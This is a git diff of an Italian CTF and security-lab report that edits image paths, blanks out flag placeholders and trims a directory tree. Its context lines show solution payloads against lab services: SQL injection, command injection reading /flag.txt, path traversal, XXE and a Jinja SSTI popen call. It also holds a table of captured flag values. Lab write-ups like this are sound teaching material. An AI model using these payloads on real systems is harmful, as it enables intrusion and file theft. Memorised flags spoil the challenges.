@@ -257,7 +257,7 @@ L'agent del Raspberry Pi personale è identificato nella dashboard con i seguent
 </figure>
 
 <figure>
-  <img src="docs/images/wazuh/agent-dashboard.png" alt="Dashboard Wazuh dell'endpoint" />
+  <img src="docs/images/wazuh/agent-overview.png" alt="Dashboard Wazuh dell'endpoint" />
   <figcaption>Dashboard dell'endpoint con inventario, eventi e informazioni MITRE ATT&CK.</figcaption>
 </figure>
 
@@ -466,7 +466,7 @@ admin' --
 127.0.0.1; cat /flag.txt
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -490,7 +490,7 @@ done
 curl -s "http://192.168.50.10:8003/view?page=/flag.txt"
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -509,7 +509,7 @@ http://192.168.50.10:8004/doc?id=3
 ...
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -655,7 +655,7 @@ curl -s http://192.168.50.10:8009/parse --data-urlencode 'xml=<?xml version="1.0
 <profilo><name>&xxe;</name></profilo>'
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -672,7 +672,7 @@ curl -s http://192.168.50.10:8009/parse --data-urlencode 'xml=<?xml version="1.0
 {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -882,7 +882,7 @@ ls -la
 cat user.txt
 ```
 
-**Flag:** `PRODIGI{… da inserire}` (contenuto di `user.txt`)
+**Flag:** (contenuto di `user.txt`)
 
 ---
 
@@ -982,7 +982,7 @@ ls -la /flags 2>/dev/null; cat /flags/* 2>/dev/null
 grep -rh PRODIGI / 2>/dev/null
 ```
 
-**Flag:** `PRODIGI{… da inserire}`
+**Flag:**
 
 ---
 
@@ -991,27 +991,27 @@ grep -rh PRODIGI / 2>/dev/null
 | Categoria | Challenge | Porta | Flag |
 |---|---|---|---|
 | Web | SQL Injection | `:8001` | `PRODIGI{sqli_b3075a032f5b}` |
-| Web | Command Injection | `:8002` | `PRODIGI{… da inserire}` |
-| Web | Path Traversal / LFI | `:8003` | `PRODIGI{… da inserire}` |
-| Web | IDOR | `:8004` | `PRODIGI{… da inserire}` |
+| Web | Command Injection | `:8002` | |
+| Web | Path Traversal / LFI | `:8003` | |
+| Web | IDOR | `:8004` | |
 | Web | JWT debole | `:8005` | `PRODIGI{jwt_d77b03838b03}` |
 | Web | Upload / RCE | `:8006` | `PRODIGI{upload_3648c9842bce}` |
 | Web | Backup esposto | `:8007` | `PRODIGI{backup_5a0a0d277d45}` |
 | Web | SSRF | `:8008` | `PRODIGI{ssrf_595f3ef63686}` |
-| Web | XXE | `:8009` | `PRODIGI{… da inserire}` |
-| Web | SSTI | `:8010` | `PRODIGI{… da inserire}` |
+| Web | XXE | `:8009` | |
+| Web | SSTI | `:8010` | |
 | Web | Pickle Deserialization | `:8011` | `PRODIGI{deserial_fec588c4599d}` |
 | Forensics | Stego | Reperto #3 | `PRODIGI{stego_a5232ce6b6af}` |
 | Forensics | Analisi PCAP | Reperto #2 | `PRODIGI{pcap_a6ad9d4c0f4a}` |
 | Forensics | DNS Exfiltration | `dns.pcap` | `PRODIGI{dns_77f9bb69c0c8}` |
 | Crypto | XOR | Reperto #1 | `PRODIGI{xor_07887e9c8ed7}` |
 | Crypto | Weak RSA | `rsa.txt` | `PRODIGI{rsa_ebb5d2838cbe}` |
-| System | SSH Foothold | `:2222` | `PRODIGI{… da inserire}` |
+| System | SSH Foothold | `:2222` | |
 | System | Privilege Escalation | box student | `PRODIGI{box_root_0aa673c0f43e}` |
 | System | SSH + privesc SUID | `:2223` | `PRODIGI{suid_983637102669}` |
-| System | SSH | `:2224` | `PRODIGI{… da inserire}` |
+| System | SSH | `:2224` | |
 
-> Le flag indicate come "da inserire" corrispondono a challenge completate durante la competizione; il valore esatto è recuperabile dagli screenshot allegati.
+
 
 #### 4.3.10 Risultato della Battle
 
@@ -1046,19 +1046,12 @@ report/
 ├── README.md
 ├── scripts/
 │   └── win-d-demo.txt
-├── docs/
-│   ├── images/
-│   │   ├── flipper-zero/
-│   │   ├── raspberry-pi/
-│   │   ├── network/
-│   │   ├── wazuh/
-│   │   └── battle/
-│   ├── reports/
-│   └── evidence/
-│       ├── nmap/
-│       ├── wazuh/
-│       └── system/
-└── configs/
+└── docs/
+    └── images/
+        ├── flipper-zero/
+        ├── raspberry-pi/
+        ├── wazuh/
+        └── battle/
 ```
 
 ### 6.1 Materiale fotografico
